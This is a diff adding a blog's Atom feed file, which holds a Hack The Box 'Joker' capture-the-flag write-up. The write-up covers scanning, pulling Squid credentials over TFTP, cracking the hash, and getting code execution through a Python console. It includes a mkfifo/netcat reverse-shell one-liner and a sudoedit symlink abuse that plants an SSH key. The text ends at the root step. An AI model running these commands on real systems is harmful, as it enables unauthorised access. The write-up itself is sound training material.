@@ -1,0 +1,532 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-26T21:45:52+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Joker - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-joker/" rel="alternate" type="text/html" title="Joker - Hack The Box" /><published>2020-04-25T00:00:00+02:00</published><updated>2020-04-25T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-joker</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-joker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/jokera.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.&lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can interact with Squid through the proxy retrieving the credentials from TFTP&lt;/li&gt;
+  &lt;li&gt;Now we can use those credentials to access the website, discovering a python console&lt;/li&gt;
+  &lt;li&gt;Sudo -l allows us to create a symlink with the user Alekos replacing our ssh key in his authorized_keys&lt;/li&gt;
+  &lt;li&gt;Using a crontab that copies archives as root, we can insert our reverse shell and become root&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;
+
+&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 3128 http-proxy Squid.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.21
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:08 CEST
+Nmap scan report for 10.10.10.21
+Host is up (0.046s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
+|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
+|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
+3128/tcp open  http-proxy Squid http proxy 3.5.12
+|_http-server-header: squid/3.5.12
+|_http-title: ERROR: The requested URL could not be retrieved
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), Linux 3.2 - 4.9 (94%), Linux 4.4 (94%), Linux 4.8 (94%), Linux 4.9 (94%), Linux 3.16 (93%), Linux 3.12 (93%), Linux 3.13 or 4.2 (93%), Linux 3.16 - 4.6 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;what-is-squid&quot;&gt;What is Squid?&lt;/h2&gt;
+
+&lt;p&gt;Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/proxy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;recon---http-proxy-squid&quot;&gt;Recon - HTTP-PROXY SQUID&lt;/h2&gt;
+
+&lt;p&gt;Using the IP address I get an error “The requested URL could not be retrieved” when I try to access the site on port 3128.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Some basic research shows that this is a general purpose proxy, so the best move is probably to route all connections through this proxy and see what’s being served locally on the machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;portscan-udp&quot;&gt;Portscan UDP&lt;/h2&gt;
+
+&lt;p&gt;We discover on the remote host 2 open UDP ports: 69 TFTP and 5355 llmnr.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sU -oA udp 10.10.10.21
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 21:23 CEST
+Nmap scan report for 10.10.10.21
+Host is up (0.048s latency).
+Not shown: 998 closed ports
+PORT     STATE         SERVICE
+69/udp   open|filtered tftp
+5355/udp open|filtered llmnr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;route-with-proxy&quot;&gt;Route with PROXY&lt;/h2&gt;
+
+&lt;p&gt;First we need to set a new proxy route with FoxyProxy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we can connect to ftp://10.10.10.21 using our proxy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get prompted for a username and password which we don’t still know.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-tftp&quot;&gt;What is TFTP?&lt;/h2&gt;
+
+&lt;p&gt;Trivial File Transfer Protocol (TFTP) is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host. One of its primary uses is in the early stages of nodes booting from a local area network. TFTP has been used for this application because it is very simple to implement.&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/tftp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;looking-into-tftp&quot;&gt;Looking into TFTP&lt;/h2&gt;
+
+&lt;p&gt;According to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is TFTP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;What is Squid&lt;/code&gt; we have to look for squid configuration files.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
+tftp&amp;gt; get /etc/squid/squid.conf
+Received 295428 bytes in 49.2 seconds 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The recovered configuration file is full of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; characters, so we will have to clean it to read the active configurations on squid.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat squid.conf | grep -v ^\#|grep .
+acl SSL_ports port 443
+acl Safe_ports port 80          # http
+acl Safe_ports port 21          # ftp
+acl Safe_ports port 443         # https
+acl Safe_ports port 70          # gopher
+acl Safe_ports port 210         # wais
+acl Safe_ports port 1025-65535  # unregistered ports
+acl Safe_ports port 280         # http-mgmt
+acl Safe_ports port 488         # gss-http
+acl Safe_ports port 591         # filemaker
+acl Safe_ports port 777         # multiling http
+acl CONNECT method CONNECT
+http_access deny !Safe_ports
+http_access deny CONNECT !SSL_ports
+http_access deny manager
+auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
+auth_param basic realm kalamari
+acl authenticated proxy_auth REQUIRED
+http_access allow authenticated
+http_access deny all
+http_port 3128
+coredump_dir /var/spool/squid
+refresh_pattern ^ftp:           1440    20%     10080
+refresh_pattern ^gopher:        1440    0%      1440
+refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
+refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
+refresh_pattern .               0       20%     4320 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The files reveal an interesting directory: /etc/squid/passwords&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; tftp 10.10.10.21
+tftp&amp;gt; get /etc/squid/passwords
+Received 48 bytes in 0.1 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat passwords 
+kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s find out what kind of password it is:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; hash-identifier
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+
+Possible Hashs:
+[+] MD5(APR)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; hashcat -m 1600 /root/Documenti/joker/joker /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 4096/10037 MB allocatable, 2MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0:ihateseafood
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
+Hash.Target......: $apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
+Time.Started.....: Sun Apr 26 00:37:29 2020 (11 mins, 1 sec)
+Time.Estimated...: Sun Apr 26 00:48:30 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    10927 H/s (11.04ms) @ Accel:256 Loops:250 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 7443968/14344385 (51.89%)
+Rejected.........: 0/7443968 (0.00%)
+Restore.Point....: 7443456/14344385 (51.89%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
+Candidates.#1....: ihateteeha -&amp;gt; ihatenikiga
+
+Started: Sun Apr 26 00:37:05 2020
+Stopped: Sun Apr 26 00:48:31 2020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;get-the-access&quot;&gt;Get the access&lt;/h2&gt;
+
+&lt;p&gt;Let’s add the new credentials found on FoxyProxy.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And then let’s connect to our localhost.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i’m going to bruteforce the web directories to find something interesting.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Apr 26 02:32:58 2020
+URL_BASE: http://127.0.0.1/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+PROXY: 10.10.10.21:3128
+PROXY AUTHORIZATION: kalamari:ihateseafood
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://127.0.0.1/ ----
++ http://127.0.0.1/console (CODE:200|SIZE:1479)                                                                             
+==&amp;gt; DIRECTORY: http://127.0.0.1/list/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/images/htb-writeup-joker/joker7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;code-execution&quot;&gt;Code Execution&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a single thread python console. This means that if we execute a wrong command, it will hang and make it impossible to execute other commands. However, if you try placing a reverse shell acting over TCP in the console, you won’t get a connection back. A quick peek at the firewall rules reveals all.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; cat base | base64 -d
+# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
+*filter
+:INPUT DROP [41573:1829596]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [878:221932]
+-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
+-A INPUT -i ens33 -p udp -j ACCEPT
+-A INPUT -i ens33 -p icmp -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
+COMMIT
+# Completed on Fri May 19 18:01:16 2017
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All the TCP connections are dropped except SSH on 22 and Squid on 3128. So we just have to understand what kind of netcat runs on the remote machine before performing a reverse shell on UDP port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got OpenBSD netcat so which means we don’t have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; flag. So, we’ll take our reverse shell on PentestMonkey http://pentestmonkey.net/.
+&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nc -u -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 53758
+/bin/sh: 0: can't access tty; job control turned off
+$ id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; pwd 
+uid=1000(werkzeug) gid=1000(werkzeug) groups=1000(werkzeug)
+werkzeug
+/var/www
+$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-alekos&quot;&gt;PrivEsc to Alekos&lt;/h2&gt;
+
+&lt;p&gt;First of all let’s spawn a full TTY shell with python:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+$ CTRL + Z
+$ stty raw -echo
+$ fg
+$ ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s take a look on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+lxd:x:107:65534::/var/lib/lxd/:/bin/false
+uuidd:x:108:113::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+werkzeug:x:1000:1000::/var/www:
+alekos:x:1001:1001:Alekos Gouzouvios,,,:/home/alekos:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ sudo -l
+Matching Defaults entries for werkzeug on joker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir
+
+User werkzeug may run the following commands on joker:
+    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Werkzeug can run commands as Alekos on the remote machine. But if we take a look on the sudo version running on this machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ dpkg -l sudo
+dpkg -l sudo
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
+||/ Name           Version      Architecture Description
++++-==============-============-============-=================================
+ii  sudo           1.8.16-0ubun amd64        Provide limited super user privil
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit sudoedit
+------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                      |  Path
+                                                                                    | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------ ----------------------------------------
+(Tod Miller's) Sudo/SudoEdit 1.6.9p21/1.7.2p4 - Local Privilege Escalation          | exploits/multiple/local/11651.sh
+Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation    | exploits/linux/local/37710.txt
+SudoEdit 1.6.8 - Local Change Permission                                            | exploits/linux/local/470.c
+------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will find an exploit for sudo version 1.8.14.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; searchsploit -x exploits/linux/local/37710.txt
+
+# Exploit Title: sudo -e - a.k.a. sudoedit -  unauthorized privilege escalation
+# Date: 07-23-2015
+# Exploit Author: Daniel Svartman
+# Version: Sudo &amp;lt;=1.8.14
+# Tested on: RHEL 5/6/7 and Ubuntu (all versions)
+# CVE: CVE-2015-5602.
+
+Hello,
+
+I found a security bug in sudo (checked in the latest versions of sudo
+running on RHEL and ubuntu) when a user is granted with root access to
+modify a particular file that could be located in a subset of directories.
+
+It seems that sudoedit does not check the full path if a wildcard is used
+twice (e.g. /home/*/*/file.txt), allowing a malicious user to replace the
+file.txt real file with a symbolic link to a different location (e.g.
+/etc/shadow).
+
+I was able to perform such redirect and retrieve the data from the
+/etc/shadow file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sudoedit doesn’t check the full path if the code is used twice. Exactly the case we got.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;werkzeug@joker:~$ cd testing/
+werkzeug@joker:~/testing$ mkdir bomb
+werkzeug@joker:~/testing$ cd bomb
+werkzeug@joker:~/testing/bomb$ ln -s /home/alekos/.ssh/authorized_keys layout.html
+werkzeug@joker:~/testing/bomb$ ls
+layout.html
+werkzeug@joker:~/testing/bomb$ sudoedit -u alekos /var/www/testing/bomb/layout.html 
+Unable to create directory /var/www/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have to create a new ssh key and paste it to the nano console:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /root/Documenti/joker/ssh_key
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/Documenti/joker/ssh_key.
+Your public key has been saved in /root/Documenti/joker/ssh_key.pub.
+The key fingerprint is:
+SHA256:5bxxhYd0SNMsXJIK4C5mtPCc4OqukFYMgKglV2RkKNk root@lorenzooo
+The key's randomart image is:
++---[RSA 3072]----+
+|+o =* ..   o=*o  |
+|B Eo .  .  .=*o  |
+|.*o . .  ...o.o  |
+|..o* +   +.  o   |
+|  .oO . S + .    |
+| o.o .     +     |
+|+.        .      |
+|+                |
+|+o               |
++----[SHA256]-----+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; cat ssh_key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCk4uBt00/4Uh82LxD/3FhgiBL3rKDbENSBEldNKdtdMd6ami2BMnN
+lGeIZrApmXh7BoK+xvE2TUlPx5KBtkklvwY7Y45yHUdMJ97Zgk8eUKe2iuQE7p6UweiRDbTZ6Us4vJostkA+q/pxVfu
+UlTAKsbZC2ad45AsKZirFeF7qhuh64NWvADPeG6zOQ4DtMHiJsQbcdBVlISPUr/haJ9nKnv23YxO9lBpOVfuUlOHBRJ
+2wAq0CuJpu2u3lGQ5TENsy/0PCCxescYxE/aRBXa2H4CO/r+LKXAO1RLGwu1MyN15MI/vYeVOGQfoL4wnB4I+Vxus3q
+3Y/DurwZwO6UqI/RByyvH45RA2nZHbn+IGyi8Lyi1ZArWRb7ZXK7d3b9P+lNwCimW5lSMYKFBzXZpOiosu+yBeAFDQH
+unpQJ6ptABORE3BOt84kghh7L+Xiww5PkogL76CKa1j62y9a7fHrcQq0WsAGt/3vx0J2rWpBqHZYRfk+KHNc2Fl02pH
+QfxGM= root@lorenzooo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo joker -&amp;gt; ssh -i ssh_key alekos@10.10.10.21
+Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
+alekos@joker:~$ whoami &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; id &amp;amp;&amp;amp; cat /home/alekos/user.txt
+alekos
+/home/alekos
+uid=1001(alekos) gid=1001(alekos) groups=1001(alekos),1000(werkzeug)
+a298121179fe93f2978d3337dbd7057b
+alekos@joker:~$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;
+
